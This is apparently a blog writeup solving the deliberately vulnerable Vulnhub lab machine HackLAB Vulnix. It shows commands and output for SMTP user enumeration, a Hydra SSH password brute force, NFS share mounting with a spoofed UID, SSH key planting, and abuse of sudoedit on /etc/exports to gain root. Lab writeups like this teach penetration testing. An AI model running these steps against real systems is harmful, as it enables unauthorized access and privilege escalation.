---
title: Vulnhub - HackLAB Vulnix
description: My writeup on HackLAB Vulnix box.
categories:
 - vulnhub
tags: vulnhub smtp metasploit smtp-user-enum hydra ssh nfs
---

![](https://i.imgur.com/B2q8rOI.jpg)

## Box Stats

| Box Info      | Details       | 
| ------------- |:-------------:| 
| Box Name :    | **HackLAB Vulnix**  | 
| Series :      | **HackLAB**         |
| Difficulty :  | **Medium**             |   
| Release Date :| **10 Sep 2012**      |    
| OS :          | **GNU/Linux**        |   
| Maker :       | [Reboot User](https://twitter.com/oshearing){:target="_blank"}     | 
| Download :    | [HackLAB Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/){:target="_blank"}      | 
| Recommended : | Yes :heavy_check_mark:      | 

## Summary

Ah, many years have passed since i pwned this box. I did this box with my friend `@Redfox`, it was a great teamwork. Let's pwn it! :sunglasses:

## PoC 

![]()

## Target IP

Always first step is to find target IP address, i prefer to use the `arp-scan` utility. Then we'll save the IP address in a variable. 

```
$ arp-scan --localnet | grep "VMware"
192.168.1.21	00:0c:29:a8:8a:f7	VMware, Inc.
$ ip=192.168.1.21
```

## Enumeration/Reconnaissance

Now as always let's continue with a nmap scan.

```
$ nmap -p- -sC -sV -oN nmap/vulnix.vulnhub $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-29 12:59 EET
Nmap scan report for vulnix.zte.com.cn (192.168.1.21)
Host is up (0.0032s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2020-11-29T11:03:13+00:00; +4s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3?
|_ssl-date: 2020-11-29T11:03:13+00:00; +4s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37743/tcp6  mountd
|   100005  1,2,3      38588/udp   mountd
|   100005  1,2,3      39752/tcp   mountd
|   100005  1,2,3      56194/udp6  mountd
|   100021  1,3,4      41725/udp6  nlockmgr
|   100021  1,3,4      50894/tcp6  nlockmgr
|   100021  1,3,4      53356/tcp   nlockmgr
|   100021  1,3,4      59885/udp   nlockmgr
|   100024  1          39049/udp   status
|   100024  1          48215/udp6  status
|   100024  1          50402/tcp6  status
|   100024  1          50714/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_ssl-date: 2020-11-29T11:03:13+00:00; +4s from scanner time.
512/tcp   open  exec?
513/tcp   open  login      OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imaps?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2020-11-29T11:03:12+00:00; +3s from scanner time.
995/tcp   open  ssl/pop3s?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2020-11-29T11:03:12+00:00; +3s from scanner time.
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
39752/tcp open  mountd     1-3 (RPC #100005)
48722/tcp open  mountd     1-3 (RPC #100005)
50714/tcp open  status     1 (RPC #100024)
53356/tcp open  nlockmgr   1-4 (RPC #100021)
57501/tcp open  mountd     1-3 (RPC #100005)
```

Ton of services, a good practise is to take them one by one. So a good start is the SMTP, SMTP (Simple Mail Transfer Protocol) is mostly used for sending out emails. SMTP allow us to perform username enumeration via the VRFY and EXPN commands.

```
VRFY = The server is asked to verify if a email address or username exists.
EXPN = This SMTP command asks for a confirmation about the identification.
```

I'll show you 2 ways to do that, with `metasploit` & `smtp-user-enum`.

Metasploit (Takes some time):

```
$ service postgresql start; msfconsole -q
msf6 > search name:smtp type:auxiliary

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   ... data ...
   3  auxiliary/scanner/smtp/smtp_enum                          normal  No     SMTP User Enumeration Utility
   ... data ...
   
msf6 > use auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOST 192.168.1.21
RHOST => 192.168.1.21
msf6 auxiliary(scanner/smtp/smtp_enum) > exploit

[*] 192.168.1.21:25       - 192.168.1.21:25 Banner: 220 vulnix ESMTP Postfix (Ubuntu)
[+] 192.168.1.21:25       - 192.168.1.21:25 Users found: , backup, bin, daemon, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, syslog, user, uucp, whoopsie, www-data
[*] 192.168.1.21:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

smtp-user-enum (Kali has it pre-installed or you can find [here](https://github.com/pentestmonkey/smtp-user-enum){:target="_blank"}):

```
$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip                                                                                 

######## Scan started at Sun Nov 29 14:09:22 2020 #########
192.168.1.21: backup exists
192.168.1.21: bin exists
192.168.1.21: daemon exists
192.168.1.21: games exists
192.168.1.21: gnats exists
192.168.1.21: irc exists
192.168.1.21: landscape exists
192.168.1.21: libuuid exists
192.168.1.21: lp exists
192.168.1.21: list exists
192.168.1.21: man exists
192.168.1.21: mail exists
192.168.1.21: messagebus exists
192.168.1.21: nobody exists
192.168.1.21: news exists
192.168.1.21: postmaster exists
192.168.1.21: postfix exists
192.168.1.21: proxy exists
192.168.1.21: root exists
192.168.1.21: ROOT exists
192.168.1.21: sshd exists
192.168.1.21: sync exists
192.168.1.21: sys exists
192.168.1.21: syslog exists
192.168.1.21: user exists
192.168.1.21: uucp exists
192.168.1.21: whoopsie exists
192.168.1.21: www-data exists
```

## Shell as user

We can detect 2 "weird" usernames the `user` & `whoopsie` so we can perform a SSH brute force attack now using `hydra`. A brute force on `user` will give us access. Note: You **_MUST_** use number of connects in parallel(-t 4).

```
$ hydra -l user -P /usr/share/wordlists/rockyou.txt $ip -t 4 ssh          

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-29 14:11:32
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://192.168.1.21:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[STATUS] 32.33 tries/min, 97 tries in 00:03h, 14344302 to do in 7393:59h, 4 active
[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active
[STATUS] 28.33 tries/min, 425 tries in 00:15h, 14343974 to do in 8437:38h, 4 active
[22][ssh] host: 192.168.1.21   login: user   password: letmein
```

```
$ ssh user@$ip       
user@192.168.1.21's password: 

user@vulnix:~$ whoami;id
user
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
```

## Shell as vulnix

We can see another user exists on the system, the user `vulnix`:

```
user@vulnix:~$ cat /etc/passwd | cut -d ':' -f 1,7 | grep bash
root:/bin/bash
user:/bin/bash
vulnix:/bin/bash
```

If we go back to nmap scan we can see that NFS is open.

```
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
```

NFS(Network File System) allows a system to share files & directories with others in a network. Let's identify the shared directory first:

```
$ showmount -e 192.168.1.21
Export list for 192.168.1.21:
/home/vulnix *
```

Let's mount it:

```
$ mkdir exp
$ mount -t nfs 192.168.1.21:/home/vulnix exp
```

But we can't access the directory:

```
$ cd exp
cd: permission denied: exp
```

Here we'll do a little trick. We'll create a temporary user on our system with the UID of vulnix.

```
user@vulnix:~$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```

```
$ useradd vulnix
$ usermod -u 2008 vulnix                                                                                                                                                         
$ su - vulnix
$ cd exp
$ ls -la
total 20
drwxr-x--- 2 nobody 4294967294 4096 Sep  2  2012 .
drwxr-xr-x 4 root   root       4096 Nov 29 14:44 ..
-rw-r--r-- 1 nobody 4294967294  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 nobody 4294967294 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 nobody 4294967294  675 Apr  3  2012 .profile
$ 
```

Perfect, now let's setup a public key authentication.

Let's generate the RSA keys first:

```
$ ssh-keygen -t rsa                                                                                                                                                             
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:I+UYBv0h1/lQGx2TJbB75/Xi7Vi6Fw5CGhewtCUoMf8 root@0xatomlab
The key's randomart image is:
+---[RSA 3072]----+
|    .+. .=.++o++.|
|     o=.+ O. +oo |
|      +=.+ o+    |
|     . =o. o..   |
|      o SE= . . o|
|       . o . o +o|
|            . + =|
|             . B.|
|              =+o|
+----[SHA256]-----+
```

Now let's copy the public key to authorized_keys:

```
$ mkdir .ssh
$ cd .ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7PjCWVlzq4mOXSnDWMtDX4OS/lsLWRgASMdqnEAeB4RWrv4ek3/HhViSDCeFwr7h8b6SyBzSMi1mMVgS+INAZY0CilZVLSax4rNlg317AYz5zBHu3AM35hf1oPf/1EssCyqjOSHK+qOe0VH4/7nltS4jfL/Wgx9WmMaNHURjeD/aPmksFqFckxmPdMdoRRaB1y1Wju6qv52zKebz0Xjo7ClL7bnpbly7ulQeL0DYJAIDEVVKKHaGF6WiGd1Vblyk96a0eULdTKfoITLAlESnveMBE6IOBl1C/G1fN6lU3R03Soo4/bu71kr+lfdjHAERPM7eq8JlfO+e4/3Szo/1EVtd1sRL8Kr58oxR8eyJVQeC7kUncbrH49A13tCNJpZHefIKyfCXyAhTR8PV1yB7xUHlA4T1njmr59MCZbSMm2czze0Zmnl3qURrHy40sb/XzyGLDXqu26oPAMJwfipfpJTY5xZMgMD2iV4SOsOJNf4lIfzPXb64eX7+HO4jW/c8= root@0xatomlab > authorized_keys
```

```
$ ssh -i id_rsa vulnix@192.168.1.21

vulnix@vulnix:~$ whoami;id
vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
```

## Shell as root

Checking the `sudo -l` we can sudoedit the `/etc/exports` file:

```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

`/etc/exports` is the configuration file for the NFS server. The syntax of the file is this:

```
Directory      hostname(options)
```

So let's simply export the `/root` directory:

```
/root           *(rw,no_root_squash)
```

```
* = all hosts
rw = read/write access
no_root_squash = Maps remote root user to the local root user
```

Save it and reboot the server. (Kinda unrealistic) Now we can see that `/root` is on shared directories.

```
$ showmount -e 192.168.1.21                                                                                                                                                      
Export list for 192.168.1.21:
/root        *
/home/vulnix *
```

Let's mount it:

```
$ mount -t nfs 192.168.1.21:/root exp       
$ cd exp
$ ls -la
total 28
drwx------ 3 nobody 4294967294 4096 Sep  2  2012 .
drwxr-xr-x 4 root   root       4096 Nov 29 14:57 ..
-rw------- 1 nobody 4294967294    0 Sep  2  2012 .bash_history
-rw-r--r-- 1 nobody 4294967294 3106 Apr 19  2012 .bashrc
drwx------ 2 nobody 4294967294 4096 Sep  2  2012 .cache
-rw-r--r-- 1 nobody 4294967294  140 Apr 19  2012 .profile
-r-------- 1 nobody 4294967294   33 Sep  2  2012 trophy.txt
-rw------- 1 nobody 4294967294  710 Sep  2  2012 .viminfo
```

We can simply setup another one public key authentication now.

```
$ mkdir .ssh
$ cd .ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7PjCWVlzq4mOXSnDWMtDX4OS/lsLWRgASMdqnEAeB4RWrv4ek3/HhViSDCeFwr7h8b6SyBzSMi1mMVgS+INAZY0CilZVLSax4rNlg317AYz5zBHu3AM35hf1oPf/1EssCyqjOSHK+qOe0VH4/7nltS4jfL/Wgx9WmMaNHURjeD/aPmksFqFckxmPdMdoRRaB1y1Wju6qv52zKebz0Xjo7ClL7bnpbly7ulQeL0DYJAIDEVVKKHaGF6WiGd1Vblyk96a0eULdTKfoITLAlESnveMBE6IOBl1C/G1fN6lU3R03Soo4/bu71kr+lfdjHAERPM7eq8JlfO+e4/3Szo/1EVtd1sRL8Kr58oxR8eyJVQeC7kUncbrH49A13tCNJpZHefIKyfCXyAhTR8PV1yB7xUHlA4T1njmr59MCZbSMm2czze0Zmnl3qURrHy40sb/XzyGLDXqu26oPAMJwfipfpJTY5xZMgMD2iV4SOsOJNf4lIfzPXb64eX7+HO4jW/c8= root@0xatomlab > authorized_keys
```

```
$ ssh -i id_rsa root@192.168.1.21 

root@vulnix:~# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
```

## Reading the flag(s)

```
root@vulnix:~# cat trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:

Until next time keep pwning hard! :fire:
